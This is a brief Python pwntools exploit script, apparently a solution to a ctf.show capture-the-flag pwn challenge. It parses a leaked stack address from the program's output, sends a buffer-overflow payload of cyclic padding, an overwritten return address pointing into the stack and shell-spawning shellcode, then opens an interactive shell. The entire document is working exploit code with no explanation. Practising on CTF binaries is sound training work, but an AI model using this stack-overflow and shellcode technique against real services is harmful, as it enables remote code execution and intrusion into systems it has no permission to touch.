from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
io = process('./pwn')
#io = remote('pwn.challenge.ctf.show',28205)
io.recvuntil('[')
v5 = io.recvuntil(']', drop=True)
v5 = int(v5, 16)
shellcode = asm(shellcraft.sh())
payload = cyclic(0x10+8) + p64(v5 + 32) + shellcode
io.sendline(payload)
io.recv()
io.interactive()
